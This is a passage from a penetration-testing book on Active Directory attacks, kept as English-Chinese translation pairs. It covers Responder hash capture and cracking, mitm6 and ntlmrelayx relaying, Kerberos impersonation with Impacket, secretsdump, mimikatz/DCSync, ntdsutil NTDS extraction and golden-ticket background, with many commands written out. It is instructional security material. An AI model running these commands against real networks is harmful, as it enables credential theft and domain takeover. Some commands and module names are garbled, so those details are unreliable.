- en: '![](../Images/B17765_12_17.png)'
  id: totrans-108
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_17.png)'
- en: 'Figure 12.17: Popup created by Responder to capture the NTLM username and password
    hash'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.17：Responder 创建的弹窗，用于捕获 NTLM 用户名和密码哈希值
- en: 'During a red team activity, we noted that security teams who successfully identified
    the rogue device went on entering the domain administrator credentials to access
    the rogue device over SMB. Now the attackers use Responder to pause the results,
    including the NTLM username and the hash, as shown in *Figure 12.18*:'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 在一次红队活动中，我们注意到那些成功识别出恶意设备的安全团队，随后通过输入域管理员凭证访问了该恶意设备的 SMB。现在，攻击者使用 Responder
    暂停结果，其中包括 NTLM 用户名和哈希值，正如 *图 12.18* 所示：
- en: '![](../Images/B17765_12_18.png)'
  id: totrans-111
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_18.png)'
- en: 'Figure 12.18: Responder poisoning the network and capturing the username and
    NTLMv2 hashes'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.18：Responder 使网络中毒并捕获用户名和 NTLMv2 哈希值
- en: 'All the log files will be available in `/usr/share/responder/logs/`, and the
    log filename will be `SMB-NTLMv2-SSP-<IP>.txt`. This can then be passed directly
    to John the Ripper or `hashcat` by running `john SMBv2-NTLMv2-SSP-<IP>.txt` for
    the offline cracking of the NTLM hash that was captured or `hashcat –m 5600 SMB-NTLVMv2-SSP-<IP>.txt
    <wordlist>.` If the dictionary did include the password, then it would be cracked,
    as *Figure 12.19* shows for `hashcat`:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 所有日志文件将保存在 `/usr/share/responder/logs/` 目录下，日志文件名为 `SMB-NTLMv2-SSP-<IP>.txt`。然后可以通过运行
    `john SMBv2-NTLMv2-SSP-<IP>.txt` 将其直接传递给 John the Ripper 进行离线破解，或者通过运行 `hashcat
    –m 5600 SMB-NTLVMv2-SSP-<IP>.txt <wordlist>` 来使用 `hashcat` 破解捕获的 NTLM 哈希。如果字典中包含了密码，那么它就会被破解，正如*图
    12.19*所示：
- en: '![](../Images/B17765_12_19.png)'
  id: totrans-114
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_19.png)'
- en: 'Figure 12.19: Successfully cracking the NTLMv2 SMB password for the user'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.19：成功破解用户的 NTLMv2 SMB 密码
- en: Performing a MiTM attack on LDAP over TLS
  id: totrans-116
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在 TLS 上执行 MiTM 攻击以攻击 LDAP
- en: In this section, we will explore how to gain local admin credentials of a given
    endpoint using a stealthy method. Microsoft Kerberos has a delegation feature
    that allows any application to reuse the user credentials to access resources
    hosted on different servers. This Kerberos delegation can be exploited when it’s
    a fresh installation of Windows servers with default configurations. This technique
    works if the network has LLMNR, NBT-NS that enforces LDAP signing, and channel
    binding of the **LDAP** (**Lightweight Directory Access Protocol**) over **TLS**
    (**Transport Layer Security**).
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探讨如何使用隐蔽方法获取给定端点的本地管理员凭证。Microsoft Kerberos 具有一个委派功能，允许任何应用程序重复使用用户凭证来访问托管在不同服务器上的资源。当
    Windows 服务器刚安装并且使用默认配置时，这个 Kerberos 委派功能可能会被利用。如果网络中有 LLMNR、NBT-NS 且强制执行 LDAP
    签名，并且有 **LDAP**（**轻量级目录访问协议**）的 **TLS**（**传输层安全性**）通道绑定，那么这个技术是可行的。
- en: In this scenario, pentesters have access to the internal network and find a
    Windows 10 device that is connected to the same network. As a first step, testers
    can identify the hostname or domain name by just running `crackmapexec` on the
    IP range. This would actually be noisy and might alert the administrators about
    you trying to authenticate to all the systems on the network anonymously.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 在这种情况下，渗透测试人员可以访问内部网络并找到一个连接到同一网络的 Windows 10 设备。作为第一步，测试人员可以通过在 IP 范围内运行 `crackmapexec`
    来识别主机名或域名。但这样做会比较“嘈杂”，可能会让管理员警觉到你正在尝试匿名地认证所有网络系统。
- en: Once the domain name and the target device are identified, we add the internal
    DNS IP to our Kali Linux by adding the `nameserver IP` to `/etc/resolv.conf` to
    ensure we can reach the local hostnames within the target network. Windows versions
    from Vista and above have IPv6 enabled by default, and when devices boot up, they
    will start looking for configurations for DHCP and WPAD.
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦确定了域名和目标设备，我们通过将`nameserver IP`添加到`/etc/resolv.conf`中，将内部DNS IP添加到我们的Kali
    Linux中，以确保我们能够访问目标网络中的本地主机名。从Vista及以上版本开始，Windows默认启用IPv6，设备启动时将开始寻找DHCP和WPAD的配置。
- en: 'We will utilize `mitm6`. This tool is not pre-installed in Kali Linux. To install
    the tool, run `sudo pip3 install mitm6` and then run `sudo mitm6 –hw <Windows
    10 machine name> -d <Domain name> --ignore-nofqdn`, which should whitelist the
    IPv6 DNS and be ready to provide the IPv6 address of the Kali Linux as part of
    the default gateway:'
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将利用`mitm6`。这个工具未预装在Kali Linux中。要安装该工具，请运行`sudo pip3 install mitm6`，然后运行`sudo
    mitm6 –hw <Windows 10机器名称> -d <域名> --ignore-nofqdn`，这应该将Kali Linux的IPv6 DNS列入白名单，并准备好作为默认网关提供Kali
    Linux的IPv6地址的一部分：
- en: '![](../Images/B17765_12_20.png)'
  id: totrans-121
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_20.png)'
- en: 'Figure 12.20: Performing a MiTM attack using mitm6'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.20：使用mitm6执行中间人攻击
- en: 'Once `mitm6` is up and running, the victim devices on the network should now
    be using the default gateway without Kali Linux IPv6 IP addresses on all the available
    targets, as seen in *Figure 12.21*:'
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦`mitm6`启动并运行，网络上的受害者设备现在应该使用所有可用目标上的默认网关，而不是Kali Linux IPv6 IP地址，如*图12.21*所示：
- en: '![](../Images/B17765_12_21.png)'
  id: totrans-124
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_21.png)'
- en: 'Figure 12.21: Target machine with the new IPv6 address added to the gateway'
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.21：目标机器添加新的IPv6地址到网关
- en: 'However, to perform the next step, a reboot of the victim device is advised.
    To capture the credentials, we will utilize Impacket, which is a collection of
    open-source modules written in Python mainly utilized to manipulate network protocols.
    It is installed by default in Kali Linux. Particularly to perform this attack,
    we will use `impacket-ntlmrelayx` to host LDAPS and WPAD services on the target
    by running the following command in the terminal, as seen in *Figure 12.22*:'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，为了执行下一步操作，建议重新启动受害者设备。为了捕获凭据，我们将利用Impacket，这是一个主要用于操作网络协议的Python开源模块集合。它默认安装在Kali
    Linux中。特别是为了执行这种攻击，我们将使用`impacket-ntlmrelayx`在目标上运行以下命令来托管LDAPS和WPAD服务，如*图12.22*所示：
- en: '[PRE8]'
  id: totrans-127
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: '![](../Images/B17765_12_22.png)'
  id: totrans-128
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_22.png)'
- en: 'Figure 12.22: Running impacket-ntlmrelay targeting LDAP and WPAD services'
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.22：运行impacket-ntlmrelay目标LDAP和WPAD服务
- en: 'When `ntlmrelayx` captures the credentials successfully, you should see the
    confirmation within the same window, as seen in *Figure 12.23*:'
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 当`ntlmrelayx`成功捕获凭据时，您应该在同一窗口中看到确认信息，如*图12.23*所示：
- en: '![](../Images/B17765_12_23.png)'
  id: totrans-131
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_23.png)'
- en: 'Figure 12.23: Successfully relaying the NTLM hash to the LDAP server'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.23：成功将NTLM哈希中继到LDAP服务器
- en: Not only does `ntlmrelayx` authenticate to the real LDAPS service, but it also
    has the ability to dump all the domain details such as domain users, domain computers,
    and domain trusts saved within the same folder where the command was run from.
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: '`ntlmrelayx`不仅认证到真正的LDAPS服务，而且还具有在运行命令的同一文件夹中保存的所有域用户、域计算机和域信任的详细信息的能力。'
- en: Additionally, NTLMrelayx should create a new machine account by relaying the
    delegation, acting as a frontend application that is trying to reuse the user
    credentials, and it will modify `msDS-AllowedToActOnBehalfOfOtherIdentity` on
    Windows 10 to allow the newly created machine to impersonate any user on that
    local machine.
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，NTLMrelayx应该通过中继委托创建一个新的计算机账户，充当尝试重用用户凭据的前端应用程序，并且它将修改Windows 10上的`msDS-AllowedToActOnBehalfOfOtherIdentity`，允许新创建的计算机模拟本地计算机上的任何用户。
- en: 'Attackers should be able to see the following confirmation:'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者应该能够看到以下确认信息：
- en: '![](../Images/B17765_12_24.png)'
  id: totrans-136
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_24.png)'
- en: 'Figure 12.24: Successfully adding a computer to the domain'
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.24：成功将计算机添加到域
- en: 'By design, in Active Directory, users can create additional machine accounts.
    The next step is to request the service ticket to access the Windows 10 impersonating
    domain admin privileges. For that, we will need to call a **service principal
    name** (**SPN**), which is a unique identifier of a service instance. SPNs are
    used by Kerberos authentication to associate a service instance with a service
    logon account. Attackers can leverage the output that was created from `lootdir`
    to get the SPNs that are available. We will now utilize the `impacket-getST` Python
    script to impersonate the highly privileged administrator account to the domain
    controller. You should be prompted to enter the password and finally capture the
    service ticket and it will be saved in `.ccache` format to the same folder where
    the command was run:'
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 根据设计，在 Active Directory 中，用户可以创建额外的机器账户。下一步是请求服务票据，以访问模拟域管理员权限的 Windows 10。为此，我们需要调用一个**服务主体名称**（**SPN**），它是服务实例的唯一标识符。SPN
    被 Kerberos 身份验证用来将服务实例与服务登录账户关联。攻击者可以利用从`lootdir`生成的输出，获取可用的 SPN。我们现在将利用`impacket-getST`
    Python 脚本模拟具有高度权限的管理员账户到域控制器。系统会提示你输入密码，最后捕获服务票据，并将其保存为`.ccache`格式，保存在运行命令的同一文件夹中。
- en: '[PRE9]'
  id: totrans-139
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: '![](../Images/B17765_12_25.png)'
  id: totrans-140
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_25.png)'
- en: 'Figure 12.25: Creating a service ticket for a specific SPN impersonating a
    high-privilege user'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.25：为特定 SPN 创建服务票据，模拟高权限用户
- en: Using the service ticket, we need to export the `KRB5CCNAME` ticket to an environment
    variable by running `export KRB5CCNAME=/Home/kali/Administrator.ccache` in the
    Kali Linux terminal. The Impacket modules will utilize the values directly from
    the environment variables. Now we are ready to authenticate to the target machine
    with the service ticket that we generated from the domain controller and run as
    a high-privileged user.
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 使用服务票据，我们需要通过在 Kali Linux 终端中运行`export KRB5CCNAME=/Home/kali/Administrator.ccache`将`KRB5CCNAME`票据导出到环境变量中。Impacket
    模块将直接从环境变量中获取这些值。现在，我们已经准备好使用从域控制器生成的服务票据对目标机器进行身份验证，并以高权限用户身份运行。
- en: 'We run `sudo impacket-wmiexec -k –no-pass –debug target-Machine-DNS-Name`.
    A successful exploitation will bring the following screen:'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: 我们运行`sudo impacket-wmiexec -k –no-pass –debug target-Machine-DNS-Name`。成功的利用将显示以下屏幕：
- en: '![](../Images/B17765_12_26.png)'
  id: totrans-144
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_26.png)'
- en: 'Figure 12.26: Executing the WMIC on the target machine'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.26：在目标机器上执行 WMIC
- en: 'Additionally, the same should also provide us with a limited shell but running
    as the user who created the service ticket. Attackers can leverage this shell
    to run the PowerShell Empire script to again complete an interactive session:'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 此外，同样的操作还应提供我们一个有限的 shell，但它是以创建服务票据的用户身份运行的。攻击者可以利用这个 shell 来运行 PowerShell
    Empire 脚本，以再次完成交互式会话：
- en: '![](../Images/B17765_12_27.png)'
  id: totrans-147
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_27.png)'
- en: 'Figure 12.27: Limited shell on the target machine as a high-privilege user'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.27：以高权限用户身份在目标机器上获得有限 shell
- en: 'We can also extract the local hash on the target machine. This can be achieved
    by running `sudo impacket-secretsdump –k –no-pass –debug <Target Machine name>`,
    which should provide us with the local hashes, as seen in *Figure 12.28*:'
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 我们还可以提取目标机器上的本地哈希值。这可以通过运行`sudo impacket-secretsdump –k –no-pass –debug <Target
    Machine name>`来实现，它应该会提供我们本地哈希值，如*图 12.28*所示：
- en: '![](../Images/B17765_12_28.png)'
  id: totrans-150
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_28.png)'
- en: 'Figure 12.28: Dumping all the local hashes from the target machine'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.28：从目标机器上转储所有本地哈希值
- en: 'One other thing pentesters normally forget is to validate the machine hash.
    Most of the time, this should provide us with lots of information such as shared
    drives on the target device. This can be verified by running `crackmapexec smb`
    on the target IP with the hash value that we get from `impacket-secretsdump`:'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: 渗透测试人员通常忘记的一件事是验证机器哈希值。大多数时候，这应该会提供大量信息，例如目标设备上的共享驱动器。这可以通过在目标 IP 上运行`crackmapexec
    smb`并使用从`impacket-secretsdump`获得的哈希值来验证：
- en: '![](../Images/B17765_12_29.png)'
  id: totrans-153
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_29.png)'
- en: 'Figure 12.29: Verifying the machine hash using crackmapexec'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.29：使用 crackmapexec 验证机器哈希值
- en: Escalating access rights in Active Directory
  id: totrans-155
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在 Active Directory 中提升访问权限
- en: We have just explored how to escalate privileges within a system and how to
    grab credentials over the network. Now let’s utilize all the details that we have
    collected so far; then we should be able to achieve the goal of penetration testing
    using the cyber kill chain methodology. In this section, we will escalate the
    privilege of a normal domain user to that of the domain administrator.
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 我们刚刚探讨了如何在系统中提升权限，以及如何通过网络获取凭据。现在让我们利用迄今为止收集的所有细节，然后我们应该能够使用网络攻击链方法实现渗透测试的目标。在本节中，我们将把普通域用户的权限提升为域管理员权限。
- en: 'We identify the system that is connected to the domain and utilize our Empire
    PowerShell tool to escalate to the domain controller and dump all the username
    and password hashes:'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 我们识别连接到域的系统，并利用我们的Empire PowerShell工具提升到域控制器，并提取所有用户名和密码哈希：
- en: '![A screenshot of a computer  Description automatically generated](../Images/B17765_12_30.png)'
  id: totrans-158
  prefs: []
  type: TYPE_IMG
  zh: '![A screenshot of a computer  Description automatically generated](../Images/B17765_12_30.png)'
- en: 'Figure 12.30: Current reporting agents in PowerShell Empire'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.30：PowerShell Empire中的当前报告代理
- en: 'You can harvest more information about the domain using the `situational_awareness`
    module, `get_domain_controller`:'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用`situational_awareness`模块`get_domain_controller`获取更多关于域的信息：
- en: '[PRE10]'
  id: totrans-161
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: '![](../Images/B17765_12_31.png)'
  id: totrans-162
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_31.png)'
- en: 'Figure 12.31: Output of the domain controller details'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.31：域控制器详细信息的输出
- en: 'To identify who is logged in to the domain, attackers can utilize the `get_loggedon`
    module, described as follows:'
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 要识别谁登录到域，攻击者可以使用`get_loggedon`模块，具体如下：
- en: '[PRE11]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: 'All users who logged in to the domain controllers will be visible, as shown
    in *Figure 12.32*:'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 所有登录到域控制器的用户都将可见，如*图12.32*所示：
- en: '![](../Images/B17765_12_32.png)'
  id: totrans-167
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_32.png)'
- en: 'Figure 12.32: Logon details on the domain controller'
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.32：域控制器上的登录详细信息
- en: 'Escalate the privilege locally by using the `getsystem` module, as shown in
    *Figure 12.33*:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 通过使用`getsystem`模块在本地提升权限，如*图12.33*所示：
- en: '![](../Images/B17765_12_33.png)'
  id: totrans-170
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_33.png)'
- en: 'Figure 12.33: Empire module successfully getting SYSTEM privilege'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.33：Empire模块成功获取SYSTEM权限
- en: The next step of the escalation methodology is to escalate the privilege to
    that of the domain administrator. This will not be required once you have run
    `mimikatz` to dump all the user passwords and hashes, as shown in the following
    screenshot.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 提升权限方法的下一步是将权限提升到域管理员级别。一旦你使用`mimikatz`提取了所有用户的密码和哈希，就不再需要这一操作，如以下截图所示。
- en: 'You can use the hash or plaintext test password to authenticate through the
    `PsExec` module in Metasploit or CrackMapExec:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以使用哈希或明文测试密码，通过Metasploit或CrackMapExec中的`PsExec`模块进行身份验证：
- en: '![](../Images/B17765_12_34.png)'
  id: totrans-174
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_34.png)'
- en: 'Figure 12.34: PowerShell Empire output of Mimikatz'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.34：PowerShell Empire输出的Mimikatz结果
- en: 'Now attackers can check all the credentials in the Empire tool’s credentials
    storage by typing `credentials` in the Empire interface, as shown in *Figure 12.35*:'
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，攻击者可以通过在Empire界面中输入`credentials`来查看Empire工具凭据存储中的所有凭据，如*图12.35*所示：
- en: '![](../Images/B17765_12_35.png)'
  id: totrans-177
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_35.png)'
- en: 'Figure 12.35: Credentials that are stored within PowerShell Empire'
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.35：存储在PowerShell Empire中的凭据
- en: 'The fastest way to dump all users in Active Directory is to use `crackmapexec
    smb` and pass the hash, as seen in *Figure 12.36*:'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: Dump Active Directory中所有用户的最快方法是使用`crackmapexec smb`并传递哈希值，如*图12.36*所示：
- en: '![](../Images/B17765_12_36.png)'
  id: totrans-180
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_36.png)'
- en: 'Figure 12.36: Extracting the NTDS using CrackMapExec'
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.36：使用CrackMapExec提取NTDS
- en: 'If the attackers choose to do it manually, the next step is to leverage CrackMapExec
    to validate the hash against the domain controller and also run the PowerShell
    Empire agent payload, as seen in *Figure 12.37*:'
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: 如果攻击者选择手动操作，下一步是利用CrackMapExec验证哈希与域控制器的一致性，并运行PowerShell Empire代理有效载荷，如*图12.37*所示：
- en: '![](../Images/B17765_12_37.png)'
  id: totrans-183
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_37.png)'
- en: 'Figure 12.37: Executing the PowerShell payload on the domain controller using
    crackmapexec'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 图12.37：使用crackmapexec在域控制器上执行PowerShell有效载荷
- en: This will invoke the domain controller so it becomes an agent to the listener.
    Once the agent is reported back to the Empire tool, we can change the agent to
    the newly reported computer by running `interact <Name>`. Then, using the `management/enable_rdp`
    module will enable **remote desktop protocol** (**RDP**) on the domain controller.
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 这将调用域控制器，使其成为监听器的代理。一旦代理报告返回到 Empire 工具，我们可以通过运行 `interact <Name>` 将代理切换到新报告的计算机。然后，使用
    `management/enable_rdp` 模块将启用 **远程桌面协议**（**RDP**）在域控制器上。
- en: 'We have to locate the entire registry of SECURITY and SYSTEM, and it is crucial
    to use `ntds.dit`. This can be performed by a single PowerShell command utilizing
    `ntdsutil`:'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: 我们必须定位整个 SECURITY 和 SYSTEM 注册表，并且必须使用 `ntds.dit`。这可以通过使用 `ntdsutil` 的单个 PowerShell
    命令来执行：
- en: '[PRE12]'
  id: totrans-187
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: What does the preceding command do?
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 上述命令的作用是什么？
- en: '`ntdsutil` is a command-line utility built into the Windows Server family that
    enables the management of Active Directory domain services.'
  id: totrans-189
  prefs: []
  type: TYPE_NORMAL
  zh: '`ntdsutil` 是一个内置于 Windows Server 系列中的命令行工具，用于管理 Active Directory 域服务。'
- en: 'This utility, **Install from Media** (**IFM**), helps us to download all the
    Active Directory database and registry settings from the domain controller to
    flat files, as shown in *Figure 12.38*. Finally, we can see these files at `c:\temp`
    with two folders, `Active Directory` and `registry`:'
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 这个工具，**从介质安装**（**IFM**），帮助我们将所有 Active Directory 数据库和注册表设置从域控制器下载到平面文件中，如 *图
    12.38* 所示。最后，我们可以在 `c:\temp` 目录中看到这两个文件夹，分别是 `Active Directory` 和 `registry`：
- en: '![](../Images/B17765_12_38.png)'
  id: totrans-191
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_38.png)'
- en: 'Figure 12.38: Manually creating the NTDS snapshots'
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.38：手动创建 NTDS 快照
- en: Now both the registry and system hive have been created in the `c:\temp` folder,
    which can be utilized for offline password cracking using `secretsdump.py`.
  id: totrans-193
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，注册表和系统 hive 已经在 `c:\temp` 文件夹中创建，可以用于通过 `secretsdump.py` 进行离线密码破解。
- en: '`secretsdump.py` is an in-built script within Kali Linux from Impacket. To
    see plaintext and hashed passwords, attackers can run `secretsdump.py -system
    <systemregistry> -security <securityregistry> -ntds <location of ntds> "LOCAL"`
    in the terminal. All Active Directory usernames and their password hashes must
    be visible to attackers.'
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: '`secretsdump.py` 是 Kali Linux 中由 Impacket 提供的内置脚本。为了查看明文和哈希密码，攻击者可以在终端运行 `secretsdump.py
    -system <systemregistry> -security <securityregistry> -ntds <ntds位置> "LOCAL"`。所有
    Active Directory 用户名及其密码哈希必须对攻击者可见。'
- en: 'Similarly, if the objective is to extract only a domain hash dump, attackers
    can utilize the agent running on the domain controller and run the `credentials/Mimikatz/dcysnc_hashdump`
    module, which will run directly on the domain controller to extract only the username
    and password hashes of all domain users, as shown in *Figure 12.39*:'
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 类似地，如果目标是仅提取域哈希转储，攻击者可以利用运行在域控制器上的代理，运行 `credentials/Mimikatz/dcysnc_hashdump`
    模块，这将直接在域控制器上运行，仅提取所有域用户的用户名和密码哈希，如 *图 12.39* 所示：
- en: '![](../Images/B17765_12_39.png)'
  id: totrans-196
  prefs: []
  type: TYPE_IMG
  zh: '![](../Images/B17765_12_39.png)'
- en: 'Figure 12.39: Output of the DCSync Hashdump module'
  id: totrans-197
  prefs: []
  type: TYPE_NORMAL
  zh: 图 12.39：DCSync Hashdump 模块的输出
- en: Compromising Kerberos – a golden-ticket attack
  id: totrans-198
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 妥协 Kerberos – 金票攻击
- en: Another set of more sophisticated (and more recent) attacks is the abuse of
    Microsoft Kerberos vulnerabilities in an Active Directory environment. A successful
    attack leads to attackers compromising domain controllers and then escalating
    the privilege to the enterprise admin and schema admin level using the Kerberos
    implementation.
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: 另一组更复杂（且更近期）的攻击是滥用 Microsoft Kerberos 在 Active Directory 环境中的漏洞。成功的攻击会导致攻击者妥协域控制器，并使用
    Kerberos 实现将特权提升到企业管理员和架构管理员级别。
- en: 'The following are typical steps when a user logs on with a username and password
    in a Kerberos-based environment:'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是在基于 Kerberos 的环境中，用户使用用户名和密码登录时的典型步骤：
- en: The user’s password is converted into an NTLM hash with a timestamp and then
    it is sent over to the **Key Distribution Center** (**KDC**).
  id: totrans-201
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 用户的密码被转换成带有时间戳的 NTLM 哈希值，然后发送到 **密钥分发中心**（**KDC**）。
- en: The domain controller checks the user information and creates a **Ticket-Granting
    Ticket** (**TGT**).
  id: totrans-202
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 域控制器检查用户信息并创建 **票证授予票证**（**TGT**）。
- en: This Kerberos TGT can only be accessed by the Kerberos service (KRBTGT).
  id: totrans-203
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这个 Kerberos TGT 只能被 Kerberos 服务（KRBTGT）访问。
- en: The TGT is then passed on to the domain controller from the user to request
    a **Ticket Granting Service** (**TGS**) ticket.
  id: totrans-204
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，TGT 被从用户传递给域控制器，向其请求 **票证授予服务**（**TGS**）票证。
- en: The domain controller validates the **Privileged Account Certificate** (**PAC**).
    If it is allowed to open the ticket, then the TGT is effectively copied to create
    the TGS.
  id: totrans-205
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 域控制器验证**特权账户证书**（**PAC**）。如果允许打开票证，则TGT将有效地复制以创建TGS。
- en: Finally, the service is granted for the user to access the services.
  id: totrans-206
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最终，用户获得访问服务的权限。
- en: Attackers can manipulate these Kerberos tickets based on the password hashes
    that are available. For example, if you have already compromised a system that
    is connected to a domain and extracted the local user credentials and password
    hashes, the next step is to identify the KRBTGT password hash to generate a golden
    ticket; this will make it a little difficult for the forensics and incident response
    teams to identify the origin of the attack.
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以根据可用的密码哈希值操纵这些Kerberos票证。例如，如果你已经入侵了连接到域的系统并提取了本地用户凭据和密码哈希值，下一步是识别KRBTGT密码哈希值以生成金票；这将使取证和事件响应团队更难识别攻击源。
- en: In this section, we will explore how easy it is to generate a golden ticket.
    We can exploit the vulnerability in just a single step by utilizing the Empire
    tool, assuming we have a domain-connected computer with a normal domain user with
    local admin privileges on that computer.
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将探讨生成金票的简便性。我们可以通过利用Empire工具中的漏洞，仅一步即可实现，前提是我们拥有一台连接到域的计算机，并且该计算机上的普通域用户具有本地管理员权限。
- en: All Active Directory controllers are responsible for handling Kerberos ticket
    requests, which are then used to authenticate the domain users. The `krbtgt` user
    account is used to encrypt and sign all the Kerberos tickets generated within
    a given domain and then the domain controllers use this account’s password to
    decrypt the Kerberos tickets for a chain of validation. Pentesters must remember
    that most service accounts, including `krbtgt`, are not subject to password expiry
    or password changes and the account name is usually the same.
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 所有活动目录控制器负责处理Kerberos票证请求，然后使用这些票证对域用户进行身份验证。`krbtgt`用户账户用于加密和签名在给定域内生成的所有Kerberos票证，然后域控制器使用该账户的密码解密Kerberos票证进行一系列验证。渗透测试人员必须记住，大多数服务账户，包括`krbtgt`，不受密码过期或密码更改的限制，并且账户名通常保持不变。
- en: 'We will use the low-privileged domain user with local admin access to generate
    the token, pass the hash to the domain controller, and generate the hash for the
    specified account. This can be achieved with the following steps:'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用具有本地管理员访问权限的低权限域用户来生成令牌，将哈希值传递给域控制器，并为指定账户生成哈希值。可以通过以下步骤实现：
